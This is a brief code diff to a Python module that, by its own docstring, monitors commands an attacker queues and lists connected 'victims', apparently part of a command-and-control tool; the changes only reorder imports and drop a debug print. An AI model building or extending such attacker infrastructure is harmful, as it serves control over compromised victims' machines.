@@ -1,13 +1,14 @@
 """Module designed to monitor commands issued by attacker to queue
 """
-from threading import Thread, Timer
-# from ..utils.consts import DEFAULT_DATA_DIR, DEFAULT_CMD_FILE
-from utils.encrypt import Encrypter
-from bundler.bundler import Bundler
 
 import math
 import os
 import time
+
+from threading import Thread, Timer
+# from ..utils.consts import DEFAULT_DATA_DIR, DEFAULT_CMD_FILE
+from utils.encrypt import Encrypter
+from bundler.bundler import Bundler
 
 class CommandParser():
 
@@ -50,7 +51,6 @@ class CommandParser():
         """Get corresponding victims that connected to the server
         """
         res = []
-        print(self.dir)
         for victim in os.listdir(self.dir):
             if os.path.isdir(os.path.join(self.dir, victim)):
                 res.append(os.path.join(self.dir, victim))
